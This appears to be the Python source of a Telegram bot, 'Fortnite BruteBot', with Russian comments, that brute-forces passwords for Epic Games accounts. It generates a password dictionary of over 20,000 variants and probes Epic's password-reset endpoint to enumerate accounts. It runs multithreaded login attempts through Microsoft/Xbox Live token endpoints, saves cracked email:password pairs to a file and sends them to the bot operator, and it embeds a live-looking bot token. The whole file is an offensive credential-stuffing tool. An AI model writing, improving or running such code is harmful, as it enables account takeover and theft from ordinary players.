#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
from telebot import types
import requests
import random
import string
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BOT_TOKEN = "8874004875:AAEslk0sxxDKXNnWtvggCc3RKUTJB4NwV14"
bot = telebot.TeleBot(BOT_TOKEN)

# ================== РАСШИРЕННЫЙ ГЕНЕРАТОР СЛОВАРЯ (20 000+) ==================
BASE_WORDS = [
    "password", "qwerty", "admin", "root", "toor", "ubuntu", "linux", "kali", "parrot",
    "blackbox", "research", "fortnite", "epicgames", "battle", "royale", "gaming",
    "winning", "legend", "dragon", "killer", "master", "michael", "jordan", "jennifer",
    "thomas", "charlie", "robert", "daniel", "jessica", "michelle", "amanda", "ashley",
    "nicole", "matthew", "andrew", "george", "joshua", "taylor", "ranger", "hunter",
    "buster", "soccer", "hockey", "baseball", "football", "superman", "batman", "starwars",
    "computer", "internet", "network", "security", "password1", "qwerty123", "admin123",
    "root123", "12345678", "123456789", "987654321", "11111111", "00000000",
    "user", "player", "gamer", "shadow", "night", "storm", "phantom", "crystal", "blaze",
    "frost", "venom", "ranger", "hunter", "warrior", "sniper", "ninja", "pirate", "ghost",
    "wolf", "eagle", "falcon", "tiger", "bear", "panda", "koala", "slayer",
    "dark", "light", "fire", "water", "earth", "wind", "sky", "moon", "sun", "star",
    "cloud", "rain", "snow", "ice", "thunder", "lightning", "hurricane", "cyclone",
    "inferno", "blizzard", "avalanche", "tsunami", "quake", "storm", "vortex",
    "phoenix", "griffin", "unicorn", "pegasus", "dragon", "hydra", "chimera"
]

SPECIALS = ["!", "@", "#", "$", "%", "^", "&", "*", "?"]
DIGITS = "0123456789"

def generate_password_variations(base_word):
    variations = set()
    # Цифры в конце
    for d in DIGITS:
        variations.add(base_word + d)
        variations.add(base_word + d + "!")
        variations.add(base_word + "!" + d)
        variations.add(base_word.capitalize() + d)
        for s in SPECIALS:
            variations.add(base_word + d + s)
            variations.add(base_word + s + d)
            variations.add(base_word.capitalize() + d + s)
    # Спецсимволы + цифры
    for s in SPECIALS:
        variations.add(base_word + s)
        variations.add(s + base_word)
        variations.add(base_word + s + "1")
        variations.add("1" + s + base_word)
        for d in DIGITS:
            variations.add(base_word + s + d)
            variations.add(d + s + base_word)
    # Leet-замены
    leet_map = {'a':'4', 'e':'3', 'i':'1', 'o':'0', 's':'5', 't':'7'}
    leet_word = ''.join(leet_map.get(c, c) for c in base_word)
    variations.add(leet_word + "!")
    variations.add(leet_word + "123")
    for d in DIGITS:
        variations.add(leet_word + d + "!")
        variations.add(leet_word + "!" + d)
    # Дублирование
    variations.add(base_word + base_word)
    variations.add(base_word + base_word + "1")
    variations.add(base_word + base_word + "!")
    for d in DIGITS:
        variations.add(base_word + base_word + d)
    # Годы
    for year in ["2020","2021","2022","2023","2024","2025","2026"]:
        variations.add(base_word + year)
        variations.add(year + base_word)
        variations.add(base_word.capitalize() + year + "!")
        for d in DIGITS:
            variations.add(base_word + year + d)
            variations.add(year + d + base_word)
    # Дополнительные комбинации с популярными суффиксами
    suffixes = ["123", "321", "abc", "xyz", "qwe", "asd", "zxc", "rty", "fgh", "vbn"]
    for sf in suffixes:
        variations.add(base_word + sf)
        variations.add(base_word + sf + "!")
        variations.add(base_word.capitalize() + sf)
    return [p for p in variations if len(p) >= 8]

PASSWORDS = []
for word in BASE_WORDS:
    PASSWORDS.extend(generate_password_variations(word))
PASSWORDS = sorted(set(PASSWORDS))
EXTRA = [
    "Password123!", "Qwerty123!", "Admin2026!", "Root@2026",
    "Fortnite@123", "EpicGames2026", "BattleRoyal!", "Gaming@2025",
    "!QAZ2wsx", "1qazxsw2", "QAZwsx123", "!@#123qwe", "P@ssw0rd2026",
    "1234567890", "0987654321", "abcdefgh", "qwertyuiop", "zxcvbnm",
    "1q2w3e4r", "1qazxsw23edc", "Qwerty2024", "Admin1234"
]
PASSWORDS.extend(EXTRA)
PASSWORDS = sorted(set(PASSWORDS))
print(f"[+] Сгенерировано {len(PASSWORDS)} паролей.")

# ================== ФУНКЦИИ EPIC (без изменений) ==================
def get_session():
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    return s

def microsoft_auth(email, password):
    session = get_session()
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": "000000004C12AE6F",
        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
        "username": email,
        "password": password,
        "grant_type": "password"
    }
    try:
        resp = session.post(url, data=data, timeout=12)
        if resp.status_code != 200:
            return None, "auth_fail"
        token_data = resp.json()
        if 'access_token' not in token_data:
            return None, "no_token"
        xbl_resp = session.post("https://user.auth.xboxlive.com/user/authenticate", json={
            "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token_data['access_token']},
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }, timeout=12)
        if xbl_resp.status_code != 200:
            return None, "xbl_fail"
        xbl_token = xbl_resp.json().get('Token')
        xsts_resp = session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={
            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
            "RelyingParty": "http://spartacertificate.epicgames.com",
            "TokenType": "JWT"
        }, timeout=12)
        if xsts_resp.status_code != 200:
            return None, "xsts_fail"
        xsts_data = xsts_resp.json()
        user_hash = xsts_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        token = xsts_data.get('Token')
        return {'user_hash': user_hash, 'token': token}, "success"
    except:
        return None, "error"

def check_fortnite(user_hash, token):
    session = get_session()
    headers = {"Authorization": f"XBL3.0 x={user_hash};{token}", "Accept": "application/json"}
    try:
        resp = session.get("https://spartacertificate.epicgames.com/api/v2/account", headers=headers, timeout=12)
        if resp.status_code == 200:
            data = resp.json()
            return {'full_access': True, 'account_id': data.get('accountId'), 'display_name': data.get('displayName'), 'vbucks': data.get('currency', {}).get('vbucks', 0)}
        return {'full_access': False}
    except:
        return {'full_access': False}

def attempt_login(email, password):
    auth_result, status = microsoft_auth(email, password)
    if status != "success" or auth_result is None:
        return None, status
    acc_info = check_fortnite(auth_result['user_hash'], auth_result['token'])
    if acc_info.get('full_access'):
        return {'account': acc_info}, "success"
    return None, "no_access"

def check_account_exists(email):
    session = get_session()
    try:
        resp = session.post("https://www.epicgames.com/account/v2/password/reset", json={"email": email}, timeout=5)
        return resp.status_code == 200
    except:
        return False

def brute_single(email, timeout=30):
    start = time.time()
    for pwd in PASSWORDS:
        if time.time() - start > timeout:
            return None
        result, status = attempt_login(email, pwd)
        if result is not None:
            return (pwd, result['account'])
    return None

# ================== КОМАНДЫ И КНОПКИ ==================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🔍 Брутфорс (email)", callback_data="bruteforce")
    btn2 = types.InlineKeyboardButton("⚡ Массовый подбор", callback_data="auto_mass")
    btn3 = types.InlineKeyboardButton("📋 Показать найденное", callback_data="show_found")
    btn4 = types.InlineKeyboardButton("⏹ Остановить", callback_data="stop")
    btn5 = types.InlineKeyboardButton("❓ Помощь", callback_data="help")
    markup.add(btn1, btn2, btn3, btn4, btn5)

    bot.send_message(
        message.chat.id,
        f"🔥 <b>Fortnite BruteBot</b>\n"
        f"💪 Мощный инструмент для подбора паролей к аккаунтам Epic Games.\n\n"
        f"📚 Словарь: <b>{len(PASSWORDS)}</b> паролей\n"
        f"⚡ Скорость: многопоточный режим\n\n"
        f"Выберите действие:",
        parse_mode="HTML",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    bot.answer_callback_query(call.id)
    if call.data == "bruteforce":
        bot.send_message(call.message.chat.id, "📧 Пример: /bruteforce player@example.com")
    elif call.data == "auto_mass":
        bot.send_message(call.message.chat.id, "⚡ Запускаю массовый подбор (20 000 email)...")
        cmd_auto_mass(call.message)
    elif call.data == "show_found":
        cmd_show_found(call.message)
    elif call.data == "stop":
        bot.send_message(call.message.chat.id, "⏹ Остановка пока не реализована.")
    elif call.data == "help":
        bot.send_message(
            call.message.chat.id,
            "📖 <b>Команды бота:</b>\n"
            "/bruteforce <email> — подбор пароля для одного аккаунта\n"
            "/auto_mass [число] — генерация email и массовая проверка\n"
            "/show_found — показать все найденные пары\n"
            "/stop — остановить процесс (пока не работает)\n"
            "/start — главное меню",
            parse_mode="HTML"
        )
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)

@bot.message_handler(commands=['bruteforce'])
def cmd_bruteforce(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Укажите email: /bruteforce target@example.com")
        return
    email = args[1]
    bot.reply_to(message, f"⏳ Брутфорс для {email}... (до 30 сек)")
    result = brute_single(email)
    if result:
        pwd, acc = result
        bot.reply_to(
            message,
            f"✅ <b>НАЙДЕН!</b>\n"
            f"📧 {email}\n"
            f"🔑 {pwd}\n"
            f"🆔 ID: {acc.get('account_id')}\n"
            f"💎 V-Bucks: {acc.get('vbucks', 0)}",
            parse_mode="HTML"
        )
        with open("found.txt", "a") as f:
            f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
    else:
        bot.reply_to(message, f"❌ Пароль не найден для {email}")

@bot.message_handler(commands=['auto_mass'])
def cmd_auto_mass(message):
    args = message.text.split()
    count = 20000 if len(args) < 2 else int(args[1])
    bot.reply_to(message, f"🚀 Генерация {count} email...")

    generated = set()
    prefixes = ["user","player","gamer","shadow","killer","master","legend","dragon","night","storm"]
    while len(generated) < count:
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices(string.digits, k=4))
        generated.add(f"{prefix}{suffix}@gmail.com")
    emails = list(generated)
    bot.reply_to(message, f"✅ Сгенерировано {len(emails)} email. Начинаю проверку существования...")

    existing = []
    lock = threading.Lock()
    progress_msg = bot.reply_to(message, f"⏳ Проверка: 0/{count}")

    def check_worker(email):
        if check_account_exists(email):
            with lock:
                existing.append(email)
        return True

    with ThreadPoolExecutor(max_workers=80) as executor:
        futures = {executor.submit(check_worker, email): email for email in emails}
        processed = 0
        for future in as_completed(futures):
            processed += 1
            if processed % 1000 == 0 or processed == count:
                bot.edit_message_text(
                    f"⏳ Проверка: {processed}/{count} | Найдено аккаунтов: {len(existing)}",
                    chat_id=progress_msg.chat.id,
                    message_id=progress_msg.message_id
                )
            future.result()

    bot.edit_message_text(
        f"🔍 Проверка завершена. Найдено {len(existing)} аккаунтов.",
        chat_id=progress_msg.chat.id,
        message_id=progress_msg.message_id
    )

    if not existing:
        bot.reply_to(message, "❌ Аккаунтов не найдено.")
        return

    bot.reply_to(message, f"⚡ Начинаю брутфорс для {len(existing)} аккаунтов (до 30 сек на каждый)...")
    found = {}
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(brute_single, email, 30): email for email in existing[:200]}
        for future in as_completed(futures):
            email = futures[future]
            result = future.result()
            if result:
                pwd, acc = result
                found[email] = (pwd, acc)
                with open("found.txt", "a") as f:
                    f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
    if found:
        msg = "\n".join([f"{e}:{pwd}" for e, (pwd, _) in found.items()])
        bot.reply_to(message, f"✅ Найдено {len(found)} аккаунтов:\n<code>{msg[:4000]}</code>", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Ничего не найдено.")

@bot.message_handler(commands=['show_found'])
def cmd_show_found(message):
    if not os.path.exists("found.txt"):
        bot.reply_to(message, "❌ Нет найденных аккаунтов.")
        return
    with open("found.txt", "r") as f:
        lines = f.readlines()
    if not lines:
        bot.reply_to(message, "❌ Файл пуст.")
        return
    pairs = []
    for line in lines:
        if ' |' in line:
            pairs.append(line.split(' |')[0])
        else:
            pairs.append(line.strip())
    content = "\n".join(pairs)
    if len(content) > 4000:
        with open("temp_pairs.txt", "w") as f:
            f.write(content)
        with open("temp_pairs.txt", "rb") as f:
            bot.send_document(message.chat.id, f, caption="📋 Все аккаунты")
        os.remove("temp_pairs.txt")
    else:
        bot.reply_to(message, f"📋 Аккаунты:\n<code>{content}</code>", parse_mode="HTML")

@bot.message_handler(commands=['help'])
def cmd_help(message):
    bot.reply_to(
        message,
        "📖 <b>Команды бота:</b>\n"
        "/bruteforce <email> — подбор пароля для одного аккаунта\n"
        "/auto_mass [число] — генерация email и массовая проверка\n"
        "/show_found — показать все найденные пары\n"
        "/stop — остановить процесс (пока не работает)\n"
        "/start — главное меню",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    bot.reply_to(message, "⏹️ Остановка не реализована в этой версии.")

@bot.message_handler(content_types=['photo'])
def get_file_id(message):
    file_id = message.photo[-1].file_id
    bot.reply_to(message, f"📸 File ID:\n<code>{file_id}</code>", parse_mode="HTML")

if __name__ == "__main__":
    try:
        bot.remove_webhook()
        print("Вебхук сброшен.")
    except Exception as e:
        print(f"Ошибка сброса вебхука: {e}")
    print(f"Бот запущен. Словарь: {len(PASSWORDS)} паролей.")
    bot.polling(non_stop=True, skip_pending=True)